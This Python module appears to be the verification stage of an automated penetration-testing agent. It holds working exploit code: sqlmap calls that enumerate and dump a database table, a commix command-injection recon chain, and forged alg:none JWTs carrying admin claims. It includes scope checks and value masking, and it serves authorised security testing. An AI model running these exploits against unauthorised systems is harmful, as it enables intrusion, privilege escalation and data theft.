"""Confirm phase — prove each candidate finding is real via active PoC.

The Attack phase collects *candidate* findings; this phase re-tests each one with an active
proof-of-concept and keeps only those it can demonstrate. Verification is bounded to the
approved target host (a defensive check that mirrors the ArmorIQ scope backstop — a verifier
must never touch anything off-scope).

Each verifier returns ``(confirmed: bool, proof: str)``. A confirmed finding carries the
extracted evidence of access (DB banner, command output, replayed-token response) into the
report; unconfirmed candidates are demoted to informational and never reported as proven.

The registry is keyed by ``findingType`` (set by the tool that produced the candidate).
Findings with no verifier and no self-evident proof are treated as unconfirmed.
"""
import base64
import json
import re
import shutil
import ssl
import subprocess
import tempfile
import urllib.error
import urllib.request
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from agent.config import SQLMAP_PATH, COMMIX_PATH


# Table / column name substrings that flag data worth calling out as "sensitive" in the
# blast-radius proof. Matched case-insensitively as substrings, so "user_accounts" hits
# "account" and "cc_number" hits "card"-adjacent terms below.
_SENSITIVE_TABLE = (
    "user", "account", "credential", "member", "customer", "admin", "login",
    "auth", "session", "token", "card", "payment", "order", "profile",
    "employee", "patient", "ssn", "secret", "wallet", "billing",
)
_SENSITIVE_COL = (
    "password", "passwd", "pass", "pwd", "secret", "token", "hash", "salt",
    "ssn", "social", "cvv", "card", "ccnum", "pan", "email", "phone", "dob",
    "birth", "apikey", "api_key", "private", "credit", "iban", "routing",
)


def _mask(value: str) -> str:
    """Redaction choke-point — every value extracted from a target passes through here
    before it is ever stored or shown. Reveals only the first character; the rest becomes
    bounded bullets. We prove access to the data without ever persisting the actual secret
    or PII (e.g. 'supersecret123' -> 's********', never the plaintext)."""
    v = (value or "").strip()
    if not v:
        return "∅"
    if len(v) == 1:
        return v
    return v[0] + "•" * min(len(v) - 1, 8)


def _run_sqlmap(args: List[str], tmpdir: str, timeout: int = 160) -> str:
    """Run one sqlmap invocation, returning combined stdout+stderr. Reuses ``tmpdir`` as
    the output dir so a follow-up call reuses the already-detected injection point (no
    re-detection cost). Returns '' on timeout; lets FileNotFoundError propagate."""
    cmd = [SQLMAP_PATH, "--batch", "--output-dir", tmpdir, "--timeout=20"] + args
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return (r.stdout or "") + "\n" + (r.stderr or "")
    except subprocess.TimeoutExpired:
        return ""


def _sql_search(pattern: str, out: str) -> str:
    m = re.search(pattern, out)
    return m.group(1).strip() if m else ""


def _parse_is_dba(out: str) -> Optional[bool]:
    m = re.search(r"current user is DBA:\s*(True|False)", out)
    return (m.group(1) == "True") if m else None


def _parse_tables(out: str) -> List[str]:
    """Table names from sqlmap's ``--tables`` output — the single-cell bordered rows
    (``| users |``). Multi-cell rows (a dump's ``| id | pw | user |``) have >2 pipes and
    are skipped, as are border rows and the ``| Table | Entries |`` count header."""
    tables: List[str] = []
    for line in out.splitlines():
        s = line.strip()
        if s.startswith("|") and s.endswith("|") and s.count("|") == 2:
            name = s.strip("|").strip()
            if name and name.lower() not in ("table", "entries") and not set(name) <= set("+-="):
                tables.append(name)
    seen: set = set()
    return [t for t in tables if not (t in seen or seen.add(t))]


def _parse_dump(out: str, table: str) -> Tuple[List[str], Dict[str, str]]:
    """Column names + the first data row from a ``--dump`` of ``table``. Returns
    (columns, {col: raw_value}); the raw values are masked by the caller before use."""
    lines = out.splitlines()
    idx = next((i for i, l in enumerate(lines) if l.strip().startswith("Table:")), None)
    if idx is None:
        return [], {}
    rows: List[List[str]] = []
    for l in lines[idx:idx + 40]:
        s = l.strip()
        if s.startswith("|") and s.endswith("|") and s.count("|") >= 3:
            rows.append([c.strip() for c in s.strip("|").split("|")])
        if len(rows) >= 2:
            break
    cols = rows[0] if rows else []
    sample = dict(zip(rows[0], rows[1])) if len(rows) >= 2 else {}
    return cols, sample


def _parse_count(out: str, table: str) -> Optional[int]:
    """Row count for ``table`` from sqlmap's ``--count`` table, or the ``[N entries]``
    marker as a fallback."""
    for line in out.splitlines():
        s = line.strip()
        if s.startswith("|") and s.count("|") == 3:
            cells = [c.strip() for c in s.strip("|").split("|")]
            if len(cells) == 2 and cells[0].lower() == table.lower() and cells[1].isdigit():
                return int(cells[1])
    m = re.search(r"\[(\d+)\s+entr", out)
    return int(m.group(1)) if m else None


def _format_sqli_proof(banner: str, dbms: str, is_dba: Optional[bool], cur_user: str,
                       cur_db: str, tables: List[str], target_table: str,
                       cols: List[str], sample: Dict[str, str],
                       row_count: Optional[int]) -> str:
    """Assemble the human-readable blast-radius proof. All extracted cell values are
    already masked here — this string is safe to store and display."""
    priv = ("DBA / full read access" if is_dba
            else "standard-privilege access" if is_dba is False
            else "confirmed read access")
    lines = [f"Confirmed SQL injection — {priv}."]

    ctx = []
    backend = (dbms + " " + banner).strip() if (dbms or banner) else ""
    if backend:
        ctx.append(f"backend {backend}")
    if cur_user:
        ctx.append(f"user '{cur_user}'")
    if cur_db:
        ctx.append(f"db '{cur_db}'")
    if ctx:
        lines.append("Context: " + ", ".join(ctx) + ".")

    if tables:
        shown = ", ".join(tables[:12]) + ("…" if len(tables) > 12 else "")
        lines.append(f"Reachable: {len(tables)} table(s) — {shown}.")

    if target_table and cols:
        cnt = f"{row_count:,} row(s)" if row_count is not None else "row count n/a"
        lines.append(f"Sensitive table '{target_table}': {cnt}; "
                     f"columns: {', '.join(cols[:10])}.")
        sens = [c for c in cols if any(k in c.lower() for k in _SENSITIVE_COL)]
        if sens:
            lines.append("Exposed sensitive columns: " + ", ".join(sens) + ".")

    if sample:
        masked = ", ".join(f"{k}={_mask(v)}" for k, v in list(sample.items())[:6])
        lines.append("Sample row (values masked): " + masked)

    return "\n".join(lines)


def _same_host(url: str, target_url: str) -> bool:
    try:
        return (urlparse(url).hostname or "") == (urlparse(target_url).hostname or "")
    except Exception:
        return False


def _finding_target(finding: Dict[str, Any], fallback: str) -> str:
    """Best-effort extraction of the specific URL a candidate was found on, from its
    evidence text; falls back to the scan target."""
    ev = finding.get("evidence", "") or ""
    for line in ev.splitlines():
        low = line.lower()
        if "http://" in low or "https://" in low:
            for token in line.split():
                if token.startswith("http://") or token.startswith("https://"):
                    return token.strip().rstrip(".,;")
    return fallback


def _finding_targets(finding: Dict[str, Any], fallback: str) -> List[str]:
    """All candidate URLs in the finding evidence (deduped, in order). sqlmap lists *every*
    tested URL, so a decoy parameterised endpoint (e.g. /ping?ip=) can appear before the
    injectable one (e.g. /user?id=) — the confirmer must try them all rather than assume the
    first is the vulnerable one."""
    ev = finding.get("evidence", "") or ""
    urls: List[str] = []
    for token in ev.split():
        if token.startswith("http://") or token.startswith("https://"):
            u = token.strip().rstrip(".,;)")
            if u not in urls:
                urls.append(u)
    return urls or [fallback]


# --- Verifiers ---------------------------------------------------------------------

def _confirm_sqli(finding: Dict[str, Any], target_url: str, ctx: dict) -> Tuple[bool, str]:
    """Prove SQLi *and map its blast radius*, safely. Two bounded sqlmap passes:

      Pass A — banner/user/db + `--is-dba` (privilege context) + `--tables` (inventory).
      Pass B — on the most sensitive table: `--columns --count` and a single `--dump --stop 1`
               row, whose values are masked by `_mask` before they ever leave this function.

    The proof answers the enterprise question ("what can an attacker actually reach?") —
    reachable tables, exposed sensitive columns, row counts, a masked sample — without
    exfiltrating a single real secret or PII value. Each candidate URL from the evidence is
    tried in turn (a decoy parameterised endpoint must not shadow the injectable one)."""
    urls = [u for u in _finding_targets(finding, target_url) if _same_host(u, target_url)]
    if not urls:
        return False, "target out of scope"
    tmpdir = tempfile.mkdtemp(prefix="sqlmap_confirm_")
    try:
        for url in urls:
            # Pass A — privilege + inventory.
            out_a = _run_sqlmap(
                ["-u", url, "--banner", "--current-user", "--current-db",
                 "--is-dba", "--tables"], tmpdir)
            banner = _sql_search(r"banner:\s*'([^']*)'", out_a)
            dbms = _sql_search(r"back-end DBMS:\s*([A-Za-z0-9]+)", out_a)
            is_dba = _parse_is_dba(out_a)
            cur_user = _sql_search(r"current user:\s*'([^']+)'", out_a)
            cur_db = _sql_search(r"current database:\s*'([^']+)'", out_a)
            tables = _parse_tables(out_a)

            # Nothing extractable on this URL → try the next candidate.
            if not (banner or tables or is_dba is not None or cur_user or cur_db):
                continue

            # Pass B — enumerate the most sensitive table (by name), else the first one.
            target_table = next(
                (t for t in tables if any(k in t.lower() for k in _SENSITIVE_TABLE)),
                tables[0] if tables else "")
            cols: List[str] = []
            sample: Dict[str, str] = {}
            row_count: Optional[int] = None
            if target_table:
                # `--dump --stop 1` already yields the real column names (header row) + one
                # sample row; `--count` yields the true row count. We deliberately do NOT pass
                # `--columns` — it prepends a "| Column | Type |" metadata table that would be
                # misparsed as the data. `--count` prints a separate "| Table | Entries |"
                # table with no "Table:" header, so it never collides with the dump parse.
                out_b = _run_sqlmap(
                    ["-u", url, "-T", target_table,
                     "--count", "--dump", "--stop", "1"], tmpdir)
                cols, sample = _parse_dump(out_b, target_table)
                row_count = _parse_count(out_b, target_table)

            return True, _format_sqli_proof(
                banner, dbms, is_dba, cur_user, cur_db,
                tables, target_table, cols, sample, row_count)
        return False, "sqlmap could not extract data on re-test"
    except FileNotFoundError:
        return False, "sqlmap not installed"
    except Exception as e:
        return False, f"sqlmap confirmation error: {e}"
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


def _parse_id_line(out: str) -> str:
    """The `id` line from command output: uid=33(www-data) gid=33(www-data) groups=..."""
    for line in out.splitlines():
        s = line.strip()
        if "uid=" in s and "gid=" in s:
            return s
    return ""


def _extract_marked(out: str, marker: str) -> str:
    """Pull the single line a labelled recon command emitted, e.g. the value between our
    `echo AG_HOST:` marker and end of line. commix wraps command output in its own banner,
    so we key off the marker we injected rather than guessing at position."""
    m = re.search(re.escape(marker) + r"\s*([^\r\n]*)", out)
    return m.group(1).strip() if m else ""


def _format_cmdi_proof(id_line: str, hostname: str, uname: str) -> str:
    """Assemble the command-injection blast-radius proof. `uname -a` and the hostname can
    leak internal names, so both pass through `_mask`-adjacent truncation and the whole
    thing stays bounded."""
    user = _sql_search(r"uid=\d+\(([^)]+)\)", id_line) or "unknown"
    uid = _sql_search(r"uid=(\d+)", id_line)
    is_root = uid == "0"
    priv = "root — full system control" if is_root else f"{user} (uid={uid})" if uid else user
    lines = [f"Confirmed OS command injection — arbitrary code execution as {priv}."]

    ctx_bits = []
    if hostname:
        ctx_bits.append(f"Host: {hostname[:80]}")
    if uname:
        # `uname -a` → "Linux <host> <kernel> #1 SMP ... x86_64 GNU/Linux"; keep it short.
        toks = uname.split()
        os_name = toks[0] if toks else uname
        kernel = toks[2] if len(toks) > 2 else ""
        ctx_bits.append(f"OS: {os_name} {kernel}".strip())
    if ctx_bits:
        lines.append(" | ".join(ctx_bits))
    if id_line:
        lines.append(f"Identity: {id_line[:200]}")
    return "\n".join(lines)


def _confirm_command_injection(finding: Dict[str, Any], target_url: str, ctx: dict) -> Tuple[bool, str]:
    """Prove OS command injection *and map its blast radius*, safely. One bounded, read-only
    recon chain via commix `--os-cmd` proves: code execution, the privilege context
    (uid/gid, whether root), the hostname, and the OS/kernel. Every command is read-only
    and produces bounded output — no writes, no egress, nothing destructive. Any obviously
    sensitive value surfaced is masked before it leaves this function."""
    url = _finding_target(finding, target_url)
    if not _same_host(url, target_url):
        return False, "target out of scope"
    tmpdir = tempfile.mkdtemp(prefix="commix_confirm_")
    # Labelled, read-only recon chained in a single shell command. Markers let us parse each
    # value back out of commix's wrapped output deterministically.
    recon = "id; echo AG_HOST:$(hostname); echo AG_UNAME:$(uname -a)"
    try:
        cmd = [
            COMMIX_PATH, "-u", url, "--batch",
            "--os-cmd", recon,          # bounded, read-only blast-radius proof
            # The server process' stdin is /dev/null (not a TTY); without this, commix
            # treats stdin as a target list and never tests -u. Force it to use the URL.
            "--ignore-stdin",
            "--output-dir", tmpdir, "--timeout", "15",
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=150,
                                stdin=subprocess.DEVNULL)
        out = result.stdout + result.stderr
        id_line = _parse_id_line(out)
        if not id_line:
            return False, "commix could not execute the proof command"
        hostname = _extract_marked(out, "AG_HOST:")
        uname = _extract_marked(out, "AG_UNAME:")
        return True, _format_cmdi_proof(id_line, hostname, uname)
    except subprocess.TimeoutExpired:
        return False, "commix confirmation timed out"
    except FileNotFoundError:
        return False, "commix not installed"
    except Exception as e:
        return False, f"commix confirmation error: {e}"
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


# Claims we try to elevate when forging, to prove the server trusts attacker-set values.
_ELEVATED_CLAIMS = {"role": "admin", "isAdmin": True, "admin": True, "user": "admin"}


def _forge_alg_none(token: str, elevate: bool = False) -> Optional[str]:
    """Rebuild the token with alg=none and no signature, preserving the claims. When
    ``elevate`` is set, overwrite present authorization claims with elevated values (only
    keys that already exist are touched, plus ``role``) to demonstrate privilege escalation."""
    try:
        parts = token.split(".")
        payload_seg = parts[1]
        pad = "=" * (-len(payload_seg) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_seg + pad))
    except Exception:
        return None
    if elevate and isinstance(payload, dict):
        for k, v in _ELEVATED_CLAIMS.items():
            if k in payload or k == "role":
                payload[k] = v
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    body = _b64url(json.dumps(payload).encode())
    return f"{header}.{body}."


def _jwt_request(url: str, token: Optional[str]) -> Tuple[int, str]:
    """Issue one request to ``url``, optionally carrying ``token`` as Bearer + cookie.
    Returns (status, body_snippet). Never raises — HTTP errors map to their status."""
    ctx_ssl = ssl.create_default_context()
    ctx_ssl.check_hostname = False
    ctx_ssl.verify_mode = ssl.CERT_NONE
    headers = {"User-Agent": "ArmorGuard/1.0"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
        headers["Cookie"] = f"jwt={token}; token={token}"
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, context=ctx_ssl, timeout=15) as resp:
            return resp.status, resp.read(2000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            body = e.read(2000).decode("utf-8", "replace")
        except Exception:
            body = ""
        return e.code, body
    except Exception:
        return -1, ""


def _mask_json_body(body: str) -> str:
    """Mask string/number values in a JSON response body so a proof can show the shape of
    the data returned to the attacker without persisting real values. Falls back to a
    bounded, masked snippet for non-JSON bodies."""
    try:
        obj = json.loads(body)
    except Exception:
        return _mask(body.strip())[:120] if body.strip() else "∅"
    if isinstance(obj, dict):
        return "{" + ", ".join(f"{k}={_mask(str(v))}" for k, v in list(obj.items())[:6]) + "}"
    return _mask(str(obj))[:120]


def _confirm_jwt(finding: Dict[str, Any], target_url: str, ctx: dict) -> Tuple[bool, str]:
    """Prove JWT signature bypass via a *differential*, not just a lone 200:

      Baseline — request the protected endpoint with NO token → expect 401/403.
      Forged   — replay an alg:none token forged from the captured sample with an elevated
                 claim (role=admin) → expect 2xx.

    A 401→2xx swing proves the server trusts unsigned, attacker-controlled claims. Any data
    the forged request returns is masked before it reaches the proof string."""
    fp = ctx.get("fingerprints", {}) or {}
    token = fp.get("jwt_sample") or ""
    if not token:
        return False, "no JWT sample captured"
    forged = _forge_alg_none(token, elevate=True)
    if not forged:
        return False, "could not forge token"

    # Find a *genuinely protected* endpoint — one that DENIES the no-token request (401/403).
    # An already-open endpoint (e.g. an unauthenticated /admin panel) proves nothing: a forged
    # token "working" there is meaningless. We require a real 401→2xx swing, so we probe each
    # candidate's baseline and only accept one that actually challenges for auth.
    endpoints = fp.get("endpoints") or []
    candidates = [e for e in endpoints
                  if any(s in e.lower() for s in ("/account", "/api", "/me", "/profile",
                                                  "/dashboard", "/admin"))
                  and _same_host(e, target_url)]
    seen: set = set()
    candidates = [e for e in candidates if not (e in seen or seen.add(e))] or [target_url]

    try:
        for ep in candidates:
            base_status, _ = _jwt_request(ep, None)
            if base_status not in (401, 403):
                continue  # not an auth wall — a forged 200 here would prove nothing
            forged_status, forged_body = _jwt_request(ep, forged)
            if 200 <= forged_status < 300:
                lines = [
                    "Confirmed JWT signature bypass — forged alg:none token accepted.",
                    f"Baseline (no token): HTTP {base_status}. "
                    f"Forged token (role=admin): HTTP {forged_status} at {ep}.",
                    "Server does not verify the token signature; arbitrary claims are trusted.",
                ]
                if forged_body.strip():
                    lines.append("Response to forged request (values masked): "
                                 + _mask_json_body(forged_body))
                return True, "\n".join(lines)
    except Exception as e:
        return False, f"replay error: {e}"
    return False, "no protected endpoint yielded a 401→2xx forged-token differential"


def _confirm_self_evident(finding: Dict[str, Any], target_url: str, ctx: dict) -> Tuple[bool, str]:
    """For findings whose detection *is* the proof (GraphQL introspection disclosure, an
    enumerated Oracle SID, a recovered JWT secret) — carry the existing evidence forward."""
    return True, finding.get("evidence", "") or "self-evident from detection output"


# findingType → verifier
CONFIRMERS: Dict[str, Callable[[Dict[str, Any], str, dict], Tuple[bool, str]]] = {
    "sql_injection": _confirm_sqli,
    "command_injection": _confirm_command_injection,
    "jwt": _confirm_jwt,
    "graphql": _confirm_self_evident,
    "oracle": _confirm_self_evident,
}


def confirm_finding(finding: Dict[str, Any], target_url: str, ctx: dict) -> Tuple[bool, str]:
    """Dispatch a candidate finding to its verifier. Unknown types with no proof stay
    unconfirmed (they'll be demoted to informational, not reported as proven)."""
    ftype = finding.get("findingType") or _infer_type(finding)
    verifier = CONFIRMERS.get(ftype)
    if verifier is None:
        return False, "no active verifier for this finding type"
    return verifier(finding, target_url, ctx)


def _infer_type(finding: Dict[str, Any]) -> str:
    """Fallback classification from the title when a tool didn't tag findingType."""
    title = (finding.get("title") or "").lower()
    if "sql injection" in title:
        return "sql_injection"
    if "command injection" in title:
        return "command_injection"
    # Only treat as a JWT *exploit* when the title names a weakness — not a generic cookie
    # note like Nikto's "Cookie jwt created without the httponly flag" (which merely mentions
    # the word "jwt"). Genuine jwt_tool findings carry findingType="jwt" and never reach here.
    if "jwt" in title and any(k in title for k in
                              ("alg", "none", "secret", "signed", "unsigned",
                               "signature", "forge", "bypass", "weak")):
        return "jwt"
    if "graphql" in title:
        return "graphql"
    if "oracle" in title:
        return "oracle"
    return "unknown"
